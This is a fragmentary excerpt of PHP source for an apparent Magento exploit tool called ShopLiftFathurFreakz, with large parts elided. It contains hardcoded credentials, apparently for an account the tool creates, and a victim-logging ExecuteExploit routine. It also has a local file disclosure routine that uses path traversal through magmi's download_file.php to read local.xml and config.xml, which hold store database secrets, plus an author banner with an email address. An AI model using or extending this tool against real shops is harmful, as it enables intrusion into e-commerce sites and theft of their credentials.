...
class ShopLiftFathurFreakz {
	private $dork = "";
	private $username = "Penjelajah";
	private $password = "Internet02@";
	...
	private function ExecuteExploit($victim){
		$file = fopen("Penjelajah-".date("d-m-Y").".log","a");
	...
	private function LocalFileDiscloure($target){
		$path = array(	"/app/etc/local.xml",
						...
						"/magmi/web/download_file.php?file=../../app/etc/config.xml"
						"../../app/etc/config.xml"
					);
	...
	public function ExploitLogo(){
		...
		$logo .= "#------------------------------------------------#\n";
		$logo .= "#\t Author \t: rasta \t\t #\n";
		$logo .= "#\t Email \t\t: snowdengbill02@gmail.com #\n";
		$logo .= "#\t Thanks to \t: Penjelajah Internet02 \t #\n";
